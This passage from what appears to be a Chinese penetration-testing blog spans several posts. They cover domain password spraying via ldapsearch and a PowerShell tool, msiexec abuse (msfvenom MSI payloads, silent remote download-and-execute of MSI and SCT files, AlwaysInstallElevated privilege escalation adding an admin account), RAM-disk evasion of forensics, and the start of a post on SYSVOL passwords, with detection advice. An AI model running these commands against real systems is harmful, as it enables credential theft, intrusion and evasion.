<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for i in $(cat test.txt); do echo -e "\n$i";ldapsearch -x -H ldap://192.168.1.1:389 -D "CN="$i",CN=Users,DC=test,DC=com" -w DomainUser123! -b "DC=test,DC=com" |grep "# numEntrie";done
</code></pre></div></div>

<p>test.txt保存所有用户名，如果口令正确，输出查询结果的个数，如果口令错误，返回验证错误：<code class="language-plaintext highlighter-rouge">ldap_bind: Invalid credentials (49)</code></p>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/3-1.png" alt="Alt text"></p>

<p>成功暴力破解出用户testb的口令</p>

<h3 id="2windows系统通过invoke-domainpasswordsprayoutsidethedomain暴力破解域用户口令">2.Windows系统通过Invoke-DomainPasswordSprayOutsideTheDomain暴力破解域用户口令</h3>

<p>DomainPasswordSpray的功能比较完整，但不支持域外的使用，所以我在DomainPasswordSpray的基础上做了一些修改，使其支持域外的使用</p>

<p>具体修改的位置如下：</p>

<p>原版中修改LDAP查询的语句:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
$DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
</code></pre></div></div>

<p>替换为LDAP的查询语句，示例：<code class="language-plaintext highlighter-rouge">"192.168.1.1/DC=test,DC=com"</code></p>

<p>最终的完整查询语句为：<code class="language-plaintext highlighter-rouge">LDAP://192.168.1.1/DC=test,DC=com</code></p>

<p>由于是在域外进行暴力破解，无法获得域用户的口令策略，所以我移除了DomainPasswordSpray中获得口令策略的功能</p>

<p>我已经将修改后的代码上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1</p>

<p>域外使用的示例命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-DomainPasswordSprayOutsideTheDomain -Domain "192.168.1.1/DC=test,DC=com" -UserList .\user.txt -Password DomainUser123! -Verbose 
</code></pre></div></div>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/4-1.png" alt="Alt text"></p>

<h2 id="0x05-利用思路">0x05 利用思路</h2>
<hr>

<h3 id="1域内暴力破解域用户口令">1.域内暴力破解域用户口令</h3>

<p>流程如下：</p>

<h4 id="1获得域内用户的口令策略">(1)获得域内用户的口令策略</h4>

<p>根据<code class="language-plaintext highlighter-rouge">lockoutThreshold</code>的数值决定尝试的次数，避免帐户被锁定</p>

<h4 id="2获得域用户列表">(2)获得域用户列表</h4>

<p>列出所有域用户后，需要对用户的属性进行判断，去除被禁用和被锁定的用户</p>

<h4 id="3尝试破解">(3)尝试破解</h4>

<h3 id="2域外暴力破解域用户口令">2.域外暴力破解域用户口令</h3>

<p>如果已经获得了一个用户的口令，那么可以先读取域内用户的口令策略和用户列表，方法同上</p>

<p>如果没有任何用户的口令，只能进行盲目的尝试</p>

<h2 id="0x06-检测方法">0x06 检测方法</h2>
<hr>

<p>域用户属性中的<code class="language-plaintext highlighter-rouge">lastbadpasswordattempt</code>能够记录上次口令输入错误的登陆时间，这可以作为识别暴力破解攻击的依据</p>

<p><code class="language-plaintext highlighter-rouge">badPwdCount</code>属性会记录用户口令错误的次数，但是用户输入正确的口令后，这个属性会被清零，无法作为判断的依据</p>

<p>如果攻击者从域内发起攻击，那么攻击者已经掌握了域内用户的口令策略和用户列表，站在防御的角度，需要确保域内用户的口令不存在规律，避免多个用户使用同一口令的情况</p>

<p>日志(4625 - An account failed to log on)能够记录登录失败的事件，例如Kali系统通过ldapsearch暴力破解域用户口令时产生的日志如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/5-1.png" alt="Alt text"></p>

<p>使用<a href="https://github.com/ropnop/kerbrute">kerbrute</a>进行暴力破解不会产生日志(4625 - An account failed to log on)，但是可以通过日志(4768 - A Kerberos authentication ticket (TGT) was requested和4771 - Kerberos pre-authentication failed)记录</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文分别介绍了在域内和域外暴力破解域用户口令的常用方法，介绍了我在测试DomainPasswordSpray时发现的一个bug(需要在更多的环境进行测试)，基于DomainPasswordSpray实现了域外暴力破解，结合利用思路，介绍检测方法。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 26, 2019
  </div>

  
</article><article class="post">
  <h1>渗透测试中的msiexec</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇研究了ClickOnce的渗透技巧，接触到了安装包的概念。关于安装包还有一个常见的是msi文件，可在命令行下通过msiexec安装，所以这次就研究一下msiexec在渗透测试中的利用技巧</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p><strong>msiexec:</strong></p>

<p>系统进程，是Windows Installer的一部分</p>

<p>用于安装Windows Installer安装包（MSI）</p>

<p>一般在运行Microsoft Update安装更新或安装部分软件的时候出现，占用内存比较大</p>

<p>系统自带，在命令行下使用，参数说明如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /Option &lt;Required Parameter&gt; [Optional Parameter]

Install Options
	&lt;/package | /i&gt; &lt;Product.msi&gt;
		Installs or configures a product
	/a &lt;Product.msi&gt;
		Administrative install - Installs a product on the network
	/j&lt;u|m&gt; &lt;Product.msi&gt; [/t &lt;Transform List&gt;] [/g &lt;Language ID&gt;]
		Advertises a product - m to all users, u to current user
	&lt;/uninstall | /x&gt; &lt;Product.msi | ProductCode&gt;
		Uninstalls the product
Display Options
	/quiet
		Quiet mode, no user interaction
	/passive
		Unattended mode - progress bar only
	/q[n|b|r|f]
		Sets user interface level
		n - No UI
		b - Basic UI
		r - Reduced UI
		f - Full UI (default)
	/help
		Help information
Restart Options
	/norestart
		Do not restart after the installation is complete
	/promptrestart
		Prompts the user for restart if necessary
	/forcerestart
		Always restart the computer after installation
Logging Options
	/l[i|w|e|a|r|u|c|m|o|p|v|x|+|!|*] &lt;LogFile&gt;
		i - Status messages
		w - Nonfatal warnings
		e - All error messages
		a - Start up of actions
		r - Action-specific records
		u - User requests
		c - Initial UI parameters
		m - Out-of-memory or fatal exit information
		o - Out-of-disk-space messages
		p - Terminal properties
		v - Verbose output
		x - Extra debugging information
		+ - Append to existing log file
		! - Flush each line to the log
		* - Log all information, except for v and x options
	/log &lt;LogFile&gt;
		Equivalent of /l* &lt;LogFile&gt;
Update Options
	/update &lt;Update1.msp&gt;[;Update2.msp]
		Applies update(s)
	/uninstall &lt;PatchCodeGuid&gt;[;Update2.msp] /package &lt;Product.msi | ProductCode&gt;
		Remove update(s) for a product
Repair Options
	/f[p|e|c|m|s|o|d|a|u|v] &lt;Product.msi | ProductCode&gt;
		Repairs a product
		p - only if file is missing
		o - if file is missing or an older version is installed (default)
		e - if file is missing or an equal or older version is installed
		d - if file is missing or a different version is installed
		c - if file is missing or checksum does not match the calculated value
		a - forces all files to be reinstalled
		u - all required user-specific registry entries (default)
		m - all required computer-specific registry entries (default)
		s - all existing shortcuts (default)
		v - runs from source and recaches local package
Setting Public Properties
	[PROPERTY=PropertyValue]
</code></pre></div></div>

<h2 id="0x02-制作msi文件">0x02 制作.msi文件</h2>
<hr>

<h3 id="1使用metasploit">1、使用metasploit</h3>

<p>msf命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">msfvenom -f msi -p windows/exec CMD=calc.exe&gt;test.msi</code></p>

<p>运行后生成test.msi</p>

<p>双击可以直接安装，如图，弹出计算器</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/2-1.png" alt="Alt text"></p>

<p>等价于在命令行下执行如下命令：</p>

<p><code class="language-plaintext highlighter-rouge">msiexec /i test.msi</code></p>

<p>如下图，同时会弹出安装的对话框，可以使用/q参数来隐藏安装界面</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/2-2.png" alt="Alt text"></p>

<p>命令行参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">msiexec /q /i test.msi</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/2-3.png" alt="Alt text"></p>

<p>执行后会在%TEMP%下生成MSI的log文件，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/2-4.png" alt="Alt text"></p>

<p>MSF为了能够让payload可扩展，生成msi文件的方式如下：</p>

<ul>
  <li>创建一个msi文件模板</li>
  <li>在文件的固定位置保留一段地址用来存储payload</li>
  <li>在运行过程中读取这个地址的内容并执行</li>
</ul>

<p>细节可参考如下链接：</p>

<p>http://rewtdance.blogspot.co.uk/2013/03/metasploit-msi-payload-generation.html</p>

<p>关于msi文件格式可参考：</p>

<p>http://www.forensicswiki.org/w/images/5/5b/Compdocfileformat.pdf</p>

<h3 id="2使用advanced-installer">2、使用Advanced Installer</h3>

<p>Advanced Installer是一款功能强大、可生成符合MS Windows认证的Windows Installer的MSI 安装包制作工具，具有友好的图形用户界面，直观而且非常简单的界面，是一款很好的 Windows Installer 编写工具</p>

<p>界面如下图，配置界面友好</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/3-1.png" alt="Alt text"></p>

<p>在自定义行为中选择自定义操作，添加 LaunchFile</p>

<p>设置启动文件等参数，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/3-2.png" alt="Alt text"></p>

<p>导出msi文件，操作如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/3-3.png" alt="Alt text"></p>

<p>生成文件如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/3-4.png" alt="Alt text"></p>

<p>命令行参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">msiexec /q /i test2.msi</code></p>

<p>成功弹出cmd.exe,如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/3-5.png" alt="Alt text"></p>

<p>值得注意的是弹出cmd的路径为c:\windows\installer\MSI3646.tmp</p>

<p>查看路径c:\windows\installer\，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/3-6.png" alt="Alt text"></p>

<p>其中6260236.msi和test2.msi的大小一样(其实就是test2.msi文件)</p>

<p>现在关闭弹出的cmd，再次查看路径c:\windows\installer\，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/3-7.png" alt="Alt text"></p>

<p>安装结束后，安装文件被删除，只留下.tmp文件，记录安装操作，内容如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/3-8.png" alt="Alt text"></p>

<p>当然，在%TEMP%下也会生成MSI的log文件</p>

<h2 id="0x03-远程下载执行msi文件">0x03 远程下载执行msi文件</h2>
<hr>

<p>之前在文章《Use SCT to Bypass Application Whitelisting Protection》研究过regsvr32的应用技巧，可以在命令行下远程执行服务器上的sct文件
命令行示例：
<code class="language-plaintext highlighter-rouge">regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll</code></p>

<p>msiexec也同样支持这个功能</p>

<p><strong>注：</strong></p>

<p>如下链接介绍了远程执行同快捷方式结合，通过ole对象插入到excel文档进行钓鱼攻击的方法:</p>

<p>https://labs.nettitude.com/blog/fun-with-windows-binaries-application-whitelist-bypass-using-msiexec/</p>

<p>将msi文件上传到服务器，通过如下命令远程执行：
<code class="language-plaintext highlighter-rouge">msiexec /q /i https://raw.githubusercontent.com/3gstudent/test/master/testmsi.png</code></p>

<p><strong>注：</strong></p>

<p>由于是msf生成的msi文件，所以默认会被杀毒软件拦截，但操作只是一个弹出计算器</p>

<p>将自己开发的msi文件上传到服务器，通过如下命令远程执行：
<code class="language-plaintext highlighter-rouge">msiexec /q /i https://raw.githubusercontent.com/3gstudent/test/master/test3.msi</code>
成功执行msi文件，弹出cmd.exe</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/4-1.png" alt="Alt text"></p>

<h2 id="0x04-权限提升">0x04 权限提升</h2>
<hr>

<p>利用组策略可以实现权限提升</p>

<p>开启AlwaysInstallElevated特权安装功能：</p>

<ul>
  <li>
    <p>打开组策略编辑器</p>
  </li>
  <li>
    <p>用户配置-管理模板-Windows 组件-Windows Installer-永远以高特权进行安装：
选择启用</p>
  </li>
  <li>
    <p>计算机配置-管理模板-Windows 组件-Windows Installer-永远以高特权进行安装：
选择启用</p>
  </li>
</ul>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/5-1.png" alt="Alt text"></p>

<p>此时会在注册表如下位置自动创建键值：</p>

<p><code class="language-plaintext highlighter-rouge">[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer]
“AlwaysInstallElevated”=dword:00000001</code></p>

<p><code class="language-plaintext highlighter-rouge">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
“AlwaysInstallElevated”=dword:00000001</code></p>

<p>接下来，使用powerup完成提权添加用户的操作</p>

<p>powerup地址：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</p>

<p>检查是否开启AlwaysInstallElevated：</p>

<p><code class="language-plaintext highlighter-rouge">Get-RegistryAlwaysInstallElevated</code></p>

<p>返回true代表系统开启AlwaysInstallElevated</p>

<p>利用AlwaysInstallElevated添加用户：</p>

<p><code class="language-plaintext highlighter-rouge">Write-UserAddMSI</code></p>

<p>运行后生成文件UserAdd.msi</p>

<p>这时以普通用户权限运行这个UserAdd.msi，成功添加账户</p>

<p>完整测试如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-28/5-2.png" alt="Alt text"></p>

<p>成功在普通权限的cmd下添加一个管理员账户</p>

<p><strong>注：</strong></p>

<p>如果获得了对注册表的访问权限，可以通过更改注册表来开启AlwaysInstallElevated（必须同时修改两处注册表键值），进而提升权限，甚至当成提权后门</p>

<p>检测是否开启AlwaysInstallElevated：</p>

<p>查看注册表即可，cmd命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></p>

<p><code class="language-plaintext highlighter-rouge">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></p>

<p>值全为1代表开启AlwaysInstallElevated，否则未开启</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>通过msiexec，不仅能够在命令行实现远程下载执行代码，还能应用于权限提升，更多的利用方法值得研究。</p>

<p>当然，对照利用方法进行防御，只要关闭AlwaysInstallElevated，即可阻止通过msi文件的提权利用。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on December 28, 2016
  </div>

  
</article><article class="post">
  <h1>渗透技巧——利用虚拟磁盘实现的“无文件”</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，常常会使用代码注入、内存执行、注册表、powershell或是wmi等无文件的技术，增加被检测和分析的难度。</p>

<p>站在渗透的角度，某些条件下并不能做到整个过程的“无文件”，需要向硬盘写入文件，这就很有可能被取证和分析。</p>

<p>最近我看到了一篇文章介绍了利用虚拟磁盘的方法，正好能解决这个问题。</p>

<p>而站在防御的角度，针对这种方法该如何检测和拦截呢？</p>

<p>参考的文章地址：</p>

<p>https://diablohorn.com/2018/08/06/creating-a-ram-disk-through-meterpreter/</p>

<p>本文将要对其进行测试，介绍实现细节，解决原文中未解决的问题，结合利用思路，分析检测和拦截的方法。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>实现原理</li>
  <li>方法复现</li>
  <li>删除残留的硬盘图标</li>
  <li>支持对文件夹的操作</li>
  <li>取证分析</li>
  <li>检测拦截</li>
</ul>

<h2 id="0x02-实现原理">0x02 实现原理</h2>
<hr>

<p>Windows系统硬盘上对文件的删除操作，只修改了文件的MFT，如果文件内容尚未被覆盖，就能恢复文件</p>

<p>详细的删除和恢复介绍可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E4%B8%8E%E5%88%A0%E9%99%A4/">《渗透技巧——Windows系统的文件恢复与删除》</a></p>

<p>如果使用虚拟磁盘，将内存映射到本地，创建内存磁盘，使用上同真正的硬盘没有区别，并且有如下两个优点：</p>

<ol>
  <li>不会对硬盘进行写操作，也就不存在硬盘文件的恢复</li>
  <li>系统重启后，内存磁盘中的文件自动删除</li>
</ol>

<h2 id="0x03-方法复现">0x03 方法复现</h2>
<hr>

<p>对文章的实现方法进行复现，地址：</p>

<p>https://diablohorn.com/2018/08/06/creating-a-ram-disk-through-meterpreter/</p>

<h3 id="imdisk">ImDisk</h3>

<p>开源工具，能够创建虚拟磁盘，介绍和下载地址：</p>

<p>http://www.ltr-data.se/opencode.html/</p>

<p>安装时会弹框提示用户，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-16/2-1.png" alt="Alt text"></p>

<p>安装成功后在<code class="language-plaintext highlighter-rouge">C:\Windows\System32\drivers\</code>下释放驱动文件imdisk.sys，在<code class="language-plaintext highlighter-rouge">C:\Windows\System32\</code>释放启动程序imdisk.exe及其支持文件</p>

<p>安装成功后，命令行输入<code class="language-plaintext highlighter-rouge">imdisk</code>启动ImDisk，回显命令说明</p>

<h3 id="二次利用">二次利用</h3>

<p>作者DiabloHorn借助开源工具ImDisk，对其进行二次利用，实现命令行下的安装、加载和虚拟磁盘的创建删除</p>

<p>准备工作：</p>

<h4 id="1编写代码实现驱动的安装加载和虚拟磁盘的创建删除">1、编写代码实现驱动的安装、加载和虚拟磁盘的创建删除</h4>

<p>代码地址：</p>

<p>https://github.com/DiabloHorn/cliramdisk</p>

<p>我的测试编译环境是VS2015，将工程中头文件stdafx.h中包含的内容保存到cliramdisk.cpp中，直接编译通过，生成文件cliramdisk.exe</p>

<h4 id="2测试系统安装imdisk获得驱动文件imdisksys">2、测试系统安装ImDisk获得驱动文件imdisk.sys</h4>

<p>安装后，在位置``C:\Windows\System32\drivers`复制驱动文件imdisk.sys</p>

<p>值得注意的是驱动文件imdisk.sys包含数字签名</p>

<h4 id="3编写注册表文件添加驱动文件信息">3、编写注册表文件，添加驱动文件信息</h4>

<p>内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ImDisk]
"DisplayName"="ImDisk Virtual Disk Driver"
"Description"="Disk emulation driver"
"Type"=dword:00000001
"Start"=dword:00000004
"ErrorControl"=dword:00000000
"ImagePath"=hex(2):5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,\
  74,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,44,00,52,\
  00,49,00,56,00,45,00,52,00,53,00,5c,00,69,00,6d,00,64,00,69,00,73,00,6b,00,\
  2e,00,73,00,79,00,73,00,00,00
"DeleteFlag"=dword:00000001
</code></pre></div></div>

<p>保存为<code class="language-plaintext highlighter-rouge">imdiskdriver.reg</code></p>

<p>###实际测试</p>

<p>1、导入注册表，添加驱动文件信息</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg import imdiskdriver.reg
</code></pre></div></div>

<p>2、上传驱动文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy imdisk.sys C:\Windows\System32\drivers\
</code></pre></div></div>

<p>3、加载驱动文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cliramdisk.exe i
</code></pre></div></div>

<p>4、创建虚拟磁盘(大小200MB)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cliramdisk.exe c 209715200 R: 0
</code></pre></div></div>

<p>5、格式化为NTFS</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>format R: /FS:NTFS /Q /y
</code></pre></div></div>

<p>之后就可以向R盘上传文件，在系统重启后会自动删除</p>

<p>6、查看虚拟磁盘</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cliramdisk.exe l
</code></pre></div></div>

<p>7、删除虚拟磁盘</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cliramdisk.exe d 0
</code></pre></div></div>

<p>删除不彻底，仍会显示磁盘图标</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-16/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>使用ImDisk删除虚拟磁盘时不存在这个bug</p>

<h3 id="不足">不足</h3>

<ol>
  <li>删除不彻底，仍会显示磁盘图标</li>
  <li>不支持对文件夹创建虚拟磁盘</li>
</ol>

<h2 id="0x04-优化">0x04 优化</h2>
<hr>

<p>为了解决上节提到的两个不足，可以考虑直接使用ImDisk，只是需要实现命令行下ImDisk的安装和使用</p>

<p>这是给出一种解决方法</p>

<h3 id="准备工作">准备工作</h3>

<p>1、测试系统安装ImDisk获得支持文件</p>

<ul>
  <li>C:\Windows\System32\drivers\imdisk.sys</li>
  <li>C:\Windows\System32\imdisk.exe</li>
  <li>C:\Windows\System32\imdisk.cpl</li>
</ul>

<p>2、编写代码实现驱动的安装</p>

<p>代码地址：</p>

<p>https://github.com/DiabloHorn/cliramdisk</p>

<p>这里可以直接使用代码中的驱动加载功能</p>

<p><strong>注：</strong></p>

<p>测试需要的所有文件已上传至github，下载地址：</p>

<p>https://github.com/3gstudent/test/raw/master/cliramdisk%26imdisk.rar</p>

<h3 id="实际测试">实际测试</h3>

<p>1、添加注册表，添加驱动文件信息</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SYSTEM\CurrentControlSet\Services\ImDisk /v DisplayName /t REG_SZ /d "ImDisk Virtual Disk Driver"
reg add hklm\SYSTEM\CurrentControlSet\Services\ImDisk /v Description /t REG_SZ /d "Disk emulation driver"
reg add hklm\SYSTEM\CurrentControlSet\Services\ImDisk /v Type /t REG_DWORD /d 1
reg add hklm\SYSTEM\CurrentControlSet\Services\ImDisk /v Start /t REG_DWORD /d 4
reg add hklm\SYSTEM\CurrentControlSet\Services\ImDisk /v ErrorControl /t REG_DWORD /d 0
reg add hklm\SYSTEM\CurrentControlSet\Services\ImDisk /v ImagePath /t REG_EXPAND_SZ /d "\SystemRoot\system32\DRIVERS\imdisk.sys"
</code></pre></div></div>

<p>2、上传驱动文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy imdisk.sys C:\Windows\System32\drivers\
</code></pre></div></div>

<p>3、加载驱动文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cliramdisk.exe i
</code></pre></div></div>

<p>4、创建虚拟磁盘<code class="language-plaintext highlighter-rouge">Z:</code>，大小10Mb，自动格式化为NTFS</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>imdisk -a -s 10M -m Z: -p "/FS:NTFS /Y /Q"
</code></pre></div></div>

<p>5、删除虚拟磁盘Z:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>imdisk -d -m Z:
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>不会存在硬盘图标存留的bug</p>

<p>6、文件夹操作</p>

<p>(1)创建</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md C:\Windows\Temp\test
imdisk -a -s 10M -m C:\Windows\Temp\test -p "/FS:NTFS /Y /Q"
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>需要空文件夹，否则创建失败</p>

<p>(2)删除</p>

<p>卸载虚拟盘：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>imdisk -d -m C:\Windows\Temp\test
</code></pre></div></div>

<p>或者直接删除文件夹：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rd C:\Windows\Temp\test
</code></pre></div></div>

<p>7、卸载驱动文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cliramdisk.exe u
</code></pre></div></div>

<h2 id="0x05-取证分析">0x05 取证分析</h2>
<hr>

<p>1、对文件夹创建虚拟磁盘</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md C:\Windows\Temp\test
imdisk -a -s 10M -m C:\Windows\Temp\test -p "/FS:NTFS /Y /Q"
</code></pre></div></div>

<p>2、写入测试文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo AAAAAAAAAAAAAAAAA&gt;C:\Windows\Temp\test\1.txt
</code></pre></div></div>

<p>3、使用WInHex查看文件内容</p>

<p>下载地址：</p>

<p>http://www.x-ways.net/winhex/</p>

<p>选择<code class="language-plaintext highlighter-rouge">Tools</code> -&gt; <code class="language-plaintext highlighter-rouge">Open Disk</code>，选择盘符<code class="language-plaintext highlighter-rouge">c:</code></p>

<p>找到文件夹<code class="language-plaintext highlighter-rouge">C:\Windows\Temp\test</code></p>

<p>无法找到测试文件1.txt</p>

<p>证明文件没有被写到硬盘</p>

<h2 id="0x06-检测拦截">0x06 检测拦截</h2>
<hr>

<p>无法通过恢复硬盘文件获得攻击者上传的文件</p>

<p>结合利用思路，可以考虑监控驱动文件，拦截驱动文件imdisk.sys的加载</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文测试了利用虚拟硬盘实现“无文件”的方法，解决两个问题(删除不彻底，不支持文件夹)，验证结论：无法通过恢复硬盘文件获得虚拟硬盘中的文件</p>

<p>最后结合利用思路，分析检测和拦截的方法</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 16, 2018
  </div>

  
</article><article class="post">
  <h1>域渗透——利用SYSVOL还原组策略中保存的密码</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章《域渗透——Local Administrator Password Solution》对LAPS的利用进行了分析。使用LAPS最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。</p>

<p>那么，如果域内未配置LAPS，如何批量设置域内主机的本地管理员密码呢？这其中又存在哪些可被利用的地方呢？</p>

<p>本文将要介绍如何利用SYSVOL还原组策略中保存的密码，分析技术细节，最后给出防御建议</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>域内共享文件夹\SYSVOL介绍</li>
  <li>域管理员批量修改域内主机本地管理员密码的方法</li>
  <li>组策略中可被利用的地方</li>
  <li>实际测试</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-域内共享文件夹sysvol介绍">0x02 域内共享文件夹\SYSVOL介绍</h2>
<hr>

<p>在域中，存在一个默认的共享路径：</p>

<p><code class="language-plaintext highlighter-rouge">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></p>

<p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等</p>

<p>例如，测试主机所在域为test.local，可访问共享文件夹<code class="language-plaintext highlighter-rouge">\\test.local\SYSVOL\test.local</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-1.png" alt="Alt text"></p>

<h2 id="0x03-域管理员批量修改域内主机本地管理员密码的方法">0x03 域管理员批量修改域内主机本地管理员密码的方法</h2>
<hr>

<h3 id="1测试server-2003系统">1、测试Server 2003系统</h3>

<p>对于server2003，想要批量修改域内主机本地管理员密码，常常通过配置组策略执行vbs脚本的方式</p>

<p>给出一个修改密码的vbs脚本(实现方式不唯一)，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strComputer = "."
Set objUser = GetObject("WinNT://" &amp; strComputer &amp; "/Administrator, user")
objUser.SetPassword "domain123!"
objUser.SetInfo
</code></pre></div></div>

<p>这种实现方式，最大的弊端在于修改后的密码会明文保存在vbs脚本中</p>

<p>而该vbs脚本通常会保存在共享文件夹\SYSVOL</p>

<p>这就存在一个隐患:</p>

<p><strong>任何域用户都能读取该vbs脚本，也就能够获取脚本中保存的明文密码</strong></p>

<h3 id="2测试server-2008系统">2、测试Server 2008系统</h3>

<p>对于server 2008，添加了新功能，可使用Group Policy Preferences配置组策略批量修改用户本地管理员密码，具体方法如下：</p>

<p>开始-管理工具-组策略管理</p>

<p>选择域test.local，右键，选中在这个域中创建GPO并在此处链接，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-2.png" alt="Alt text"></p>

<p>设置名称为test6</p>

<p>test6-设置-右键-编辑-用户配置-首选项-控制面板设置-本地用户和组,如下图</p>

